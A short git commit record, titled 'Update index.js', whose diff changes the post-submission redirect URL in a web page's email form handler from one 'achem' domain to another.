5abdbfd586d3cac7315a1be6af62d62d2b80b3cc
husknet <127146284+husknet@users.noreply.github.com>
2025-01-14 19:16:18 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ss.achemsite.info';
+        window.location.href = 'https://ss.achemwebsite.info';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
